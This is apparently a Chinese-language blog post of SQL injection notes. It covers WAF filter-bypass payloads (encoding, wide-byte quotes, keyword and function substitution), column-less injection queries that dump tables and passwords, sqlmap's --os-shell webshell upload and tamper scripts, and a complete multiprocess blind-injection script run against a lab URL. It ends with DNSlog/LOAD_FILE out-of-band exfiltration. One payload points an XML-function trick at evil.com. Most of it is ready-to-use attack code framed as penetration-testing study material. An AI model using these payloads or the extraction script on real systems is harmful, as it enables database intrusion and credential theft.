<h2 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">绕过方式 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">宽字节绕过</span></span><br><span class="line"><span class="string">%bf%27 %df%27 %aa%27</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<span class="keyword">from</span> <span class="keyword">to</span>的方式来解决：</span><br><span class="line">selectsubstr(database(<span class="number">0</span>from1for1);selectmid(database(<span class="number">0</span>from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用<span class="keyword">offset</span>来绕过：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromnews limit0,<span class="number">1</span># 等价于下面这条<span class="keyword">SQL</span>语句<span class="keyword">select</span><span class="operator">*</span>fromnews limit1offset0</span><br></pre></td></tr></table></figure>


<h2 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>


<h2 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line"></span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) </span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<h2 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>


<h2 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PostgreSQL支持XML函数：<span class="keyword">Select</span> UpdateXML(‘<span class="operator">&lt;</span>script x<span class="operator">=</span>_<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span> ’,’<span class="operator">/</span>script<span class="operator">/</span><span class="variable">@x</span><span class="operator">/</span>’,’src<span class="operator">=</span><span class="operator">/</span><span class="operator">/</span>evil.com’);　　　　　　　　　　</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> xmlelement(name img,xmlattributes(<span class="number">1</span><span class="keyword">as</span> src,<span class="string">&#x27;a\l\x65rt(1)&#x27;</span><span class="keyword">as</span> \<span class="number">117</span>n\x65rror));　<span class="operator">/</span><span class="operator">/</span>postgresql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>))</span><br></pre></td></tr></table></figure>


<h2 id="N绕过"><a href="#N绕过" class="headerlink" title="\N绕过"></a>\N绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>

<p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><center>无列名注入</center></h1><p>遇到information_schema.tables被过滤、转义、删除的情况下使用</p>
<p>Payload</p>
<p>猜表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>猜数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>

<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><center>Sqlmap</center></h1><h2 id="–os-shell的原理"><a href="#–os-shell的原理" class="headerlink" title="–os-shell的原理"></a>–os-shell的原理</h2><ul>
<li>使用条件<ol>
<li>网站必须是root权限</li>
<li>攻击者需要知道网站的绝对路径</li>
<li>GPC为off，php主动转义的功能关闭</li>
</ol>
</li>
</ul>
<p>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownunsKjTko6QxSAY3.png"></p>
<p>也就是上传一个功能马</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##此处用法为：程序到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多行注释符，此处为三个双引号，因为是其中也有单引号，并且该说明为一般文档说明，故用三个双引号</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#导入python中的re 字符替换包，方便下面的字符替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb <span class="comment">#导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kb</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY  <span class="comment">#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py</span></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL <span class="comment">#定义优先级，此处为级别为【一般】</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():  <span class="comment">#定义dependencies():此处是为了和整体脚本的结构保持一致。</span></span><br><span class="line">    <span class="keyword">pass</span>   <span class="comment">#pass 不做任何事情，一般用做占位语句。为了保持程序结构的完整性。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):  <span class="comment">#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125; </span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;like&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="增加新的Payload"><a href="#增加新的Payload" class="headerlink" title="增加新的Payload"></a>增加新的Payload</h2><p>目录在<code>./data/xml/payload</code></p>
<p>可以看到6个xml文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowncjM2FqdQuzpoN9C.png"></p>
<p>拿<code>boolean_blind.xml文件</code>里面的一部分来分析</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>SAP MaxDB boolean-based blind - Stacked queries<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">level</span>&gt;</span>5<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">vector</span>&gt;</span>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">payload</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comment</span>&gt;</span>--<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dbms</span>&gt;</span>SAP MaxDB<span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>title<br>  title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。</p>
</li>
<li><p>stype<br>  查询类型。</p>
</li>
<li><p>level<br>  风险等级(1-5,默认1)。</p>
</li>
<li><p>risk<br>  危险等级(1-3,默认1)。</p>
</li>
<li><p>clause<br>  指定为每个payload使用的SQL查询从句。</p>
<p>  <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown7Ftj9qHuXD1zeUV.png"></p>
</li>
<li><p>where<br>  与上图一致。</p>
</li>
<li><p>vector<br>  指定将使用的注入模版。</p>
</li>
<li><p>payload<br>  测试使用的payload ,[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。</p>
</li>
<li><p>common<br>  payload 之后，boundary 拼接的后缀suffix之前。</p>
</li>
<li><p>char<br>  在union 查询中爆破列时所用的字符。</p>
</li>
<li><p>columns<br>  联合查询测试的列数范围。</p>
</li>
<li><p>response<br>  根据回显辨别这次注入的payload是否成功。</p>
</li>
<li><p>comparison<br>  使用字符串作为payload执行请求，将响应和负载响应进行对比，在基于布尔值的盲注中有效。</p>
</li>
<li><p>grep<br>  使用正则表达式去批结响应，判断时候注入成功，在基于错误的注入中有用。</p>
</li>
<li><p>time<br>  在基于time的注入中等待结果返回的所需要的时间</p>
</li>
<li><p>detail<br>  下设三个子节点</p>
</li>
</ul>
<p>最终的payload为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">+</span> boundary.prefix<span class="operator">+</span>test.payload <span class="operator">+</span> test.common <span class="operator">+</span> <span class="operator">+</span>boundary.suffix</span><br></pre></td></tr></table></figure>

<h1 id="二分法-多进程脚本"><a href="#二分法-多进程脚本" class="headerlink" title="二分法 + 多进程脚本"></a><center>二分法 + 多进程脚本</center></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rich.console <span class="keyword">import</span> Console</span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CtrlC</span>(<span class="params">q2</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> q2.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = q2.get()</span><br><span class="line">    table = PrettyTable(</span><br><span class="line">        [<span class="string">&#x27;The blasting data is&#x27;</span>])</span><br><span class="line">    table.align = <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    row = [name]</span><br><span class="line">    table.add_row(row)</span><br><span class="line">    clear()</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">booler_injection</span>(<span class="params">url, q, q2, v</span>):</span><br><span class="line">    console = Console()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        i = q.get()</span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            py_dict = &#123;</span><br><span class="line">                <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name = 0x4E43683258684E62),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str4&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(password) from security.NCh2XhNb),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            payload_str = py_dict[<span class="string">&#x27;str2&#x27;</span>].<span class="built_in">format</span>(i, mid)</span><br><span class="line">            pld = url + payload_str</span><br><span class="line">            req1 = requests.get(pld)</span><br><span class="line">            <span class="built_in">print</span>(pld, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> req1.text.find(<span class="string">&#x27;You are in&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            q2.put(v.value)</span><br><span class="line">            CtrlC(q2)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">44</span>:</span><br><span class="line">            v.value += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        v.value += <span class="built_in">chr</span>(mid)</span><br><span class="line">        v.value = v.value.replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        clear()</span><br><span class="line">        console.<span class="built_in">print</span>(<span class="string">&quot;[green][+]data is -&gt; [/green]&quot;</span> + v.value + <span class="string">&#x27;\n&#x27;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    v = Manager().Value(ctypes.c_char_p, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 创建临界</span></span><br><span class="line">    q2 = Queue()</span><br><span class="line">    q = Queue()</span><br><span class="line">    url = <span class="string">&quot;http://533b285a34d54db5a8e3acafda30c067.app.mituan.zone/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">    progress1 = []</span><br><span class="line">    generate(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        p1 = Process(target=booler_injection, args=(url, q, q2, v))</span><br><span class="line">        progress1.append(p1)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过多次测试，存在一定缺陷：</p>
<p>  需要的数据长度低于10，进程数不能大于2，用1最好。</p>
<p>  需要的数据在10 - 20之间，进程数不能大于3，用2最好。</p>
<p>  需要的数据在20 - 30之间，进程数不能大于4，用3最好。</p>
<p>  以此类推。。。。。</p>
<p>  如若使用的进程数超出我提出的大小，会导致进程竞争进而出现乱序输出的情况。</p>
<p>但是单纯的多进程不会出现这个问题，初步判断是二分法大幅度的降低了对资源的调用，提高了写入临界区的频率，进而导致进程竞争，出现输出乱序，而我用的又是队列实现，需要对queue队列的锁原语<code>__init__</code> 才能解决（<del>一个猜测</del>），留个坑，以后填。</p>
<p>上面问题已解决：<font color="red"><strong>添加进程睡眠时间即可解决！！！</strong></font></p>
<h1 id="基于LOAD-FILE函数的无回显SQL注入"><a href="#基于LOAD-FILE函数的无回显SQL注入" class="headerlink" title="基于LOAD_FILE函数的无回显SQL注入"></a><center>基于LOAD_FILE函数的无回显SQL注入</center></h1><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查看load_file()可以读取的磁盘。</p>
<ul>
<li>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录。</li>
<li>当<code>secure_file_priv</code>为G:\，就可以读取G盘的文件。</li>
<li>当<code>secure_file_priv</code>为null，load_file就不能加载文件。</li>
</ul>
<h2 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h2><p>但是当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据。</p>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器。<br>UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
